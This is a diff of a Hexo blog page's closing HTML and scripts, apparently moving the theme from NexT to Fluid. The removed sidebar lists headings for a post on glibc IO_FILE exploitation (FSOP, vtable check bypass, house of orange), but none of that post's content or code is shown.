+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/IO/" rel="tag"># IO</a>
-          </div>
-
-        
 
 
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" rel="prev" title="2.23 IO相关源码阅读笔记">
-      <i class="fa fa-chevron-left"></i> 2.23 IO相关源码阅读笔记
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/02/24/house-of-cat/" rel="next" title="house of cat">
-      house of cat <i class="fa fa-chevron-right"></i>
-    </a></div>
+  </aside>
+
+
     </div>
-      </footer>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
     
-  </article>
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
   
   
   
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
 
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-          </div>
-          
 
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
       }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
     }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
     });
-  }
+  });
 </script>
 
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
 
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
+  <script>Fluid.plugins.codeWidget();</script>
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-23"><span class="nav-number">1.1.</span> <span class="nav-text">2.23</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#vtable%E5%8A%AB%E6%8C%81"><span class="nav-number">1.1.1.</span> <span class="nav-text">vtable劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FSOP"><span class="nav-number">1.1.2.</span> <span class="nav-text">FSOP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-number">1.1.3.</span> <span class="nav-text">调用链</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-24-2-27"><span class="nav-number">1.2.</span> <span class="nav-text">2.24-2.27</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#vtable-check"><span class="nav-number">1.2.1.</span> <span class="nav-text">vtable check</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vtable-check%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.2.</span> <span class="nav-text">vtable check绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">调用链</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-28%E4%BB%A5%E5%90%8E"><span class="nav-number">1.3.</span> <span class="nav-text">2.28以后</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%9C%E5%8D%8E%E6%9D%AF2016-pwn450-note%EF%BC%882-23%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">东华杯2016-pwn450 note（2.23）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">2.1.1.</span> <span class="nav-text">静态分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.1.2.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">泄露libc</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9B%E9%80%A0%E5%A4%9A%E4%B8%AAchunk"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">创造多个chunk</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#unsorted-bin-attack"><span class="nav-number">2.1.2.3.</span> <span class="nav-text">unsorted bin attack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#house-of-orange"><span class="nav-number">2.1.2.4.</span> <span class="nav-text">house of orange</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ps"><span class="nav-number">2.1.2.5.</span> <span class="nav-text">ps</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">2.1.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Eurus"
-      src="/images/avatar.jpg">
-  <p class="site-author-name" itemprop="name">Eurus</p>
-  <div class="site-description" itemprop="description">本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">46</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">16</span>
-        <span class="site-state-item-name">categories</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">27</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://github.com/akaieurus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;akaieurus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="/1826983968@qq.com" title="E-Mail → 1826983968@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2024</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">true</span>
-</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
 
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
 
-<script src="/js/utils.js"></script>
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
 
-<script src="/js/motion.js"></script>
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
 
 
-<script src="/js/schemes/pisces.js"></script>
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
-<script src="/js/next-boot.js"></script>
 
 
-  <script defer src="/lib/three/three.min.js"></script>
-    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
 
 
   
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-
-  <script async src="/js/cursor/fireworks.js"></script>
-
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
